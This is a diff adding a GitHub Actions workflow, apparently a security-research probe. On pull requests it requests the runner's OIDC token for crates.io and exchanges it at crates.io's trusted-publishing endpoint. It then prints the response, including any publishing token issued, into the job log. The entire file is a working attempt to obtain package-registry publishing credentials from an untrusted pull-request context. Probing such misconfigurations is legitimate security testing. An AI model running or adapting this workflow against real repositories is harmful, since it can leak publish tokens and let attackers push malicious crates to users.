@@ -1,0 +1,25 @@
+name: OIDC crates probe
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: prod-branchpolicy
+    steps:
+      - name: Claims and exchange
+        run: |
+          echo "event_name=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=crates.io" -o /tmp/oidc.json
+          python3 -c "import json;d=json.load(open('/tmp/oidc.json'));open('/tmp/tok','w').write(d.get('value',''));print('got_token', bool(d.get('value')))"
+          echo "--- crates.io exchange ---"
+          curl -sS -D /tmp/hdr.txt -o /tmp/resp.txt -w 'HTTP %{http_code}\n' -X POST "https://crates.io/api/v1/trusted_publishing/tokens" \
+            -H "Content-Type: application/json" -H "User-Agent: blume-research (security test)" \
+            -d "{\"jwt\":\"$(cat /tmp/tok)\"}"
+          echo "--- body ---"; cat /tmp/resp.txt; echo
+          grep -iE '^(x-|cf-|server|content-type)' /tmp/hdr.txt | head -8
